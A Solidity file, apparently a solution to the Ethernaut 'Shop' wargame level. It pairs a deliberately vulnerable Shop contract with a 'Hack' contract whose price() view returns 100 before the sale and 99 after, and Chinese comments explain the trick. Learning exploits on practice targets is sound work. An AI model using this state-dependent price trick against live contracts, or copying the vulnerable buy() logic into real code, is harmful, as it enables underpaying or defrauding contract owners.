// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * ********* Shop.sol *********
 * 1、逻辑：Buyer(msg.sender)所以可以修改 Buyer 接口的price
 * 1） 第一次调用时，isSold 为 false，price > 100 -----bool public isSold声明了一个名为isSold的公共布尔变量，并将其初始值设置为false（声明一个公共的布尔类型变量时，如果你没有显式地给它赋初值，它会被默认初始化为false）。
 *     第二次调用时，isSold 为 true，price  < 100
 *
 * 2) view 函数不能写状态变量
 *     - 函数 buy() 会调用函数 price();
 *
 * @notice
 */

contract Hack {
    Shop private immutable target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function pwn() external {
        target.buy();
        require(target.price() == 99, "price != 99");
    }

    function price() external view returns (uint) {
        if (target.isSold()) {
            // 第二次调用
            return 99;
        }
        // 第一次调用
        return 100;
    }
}

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
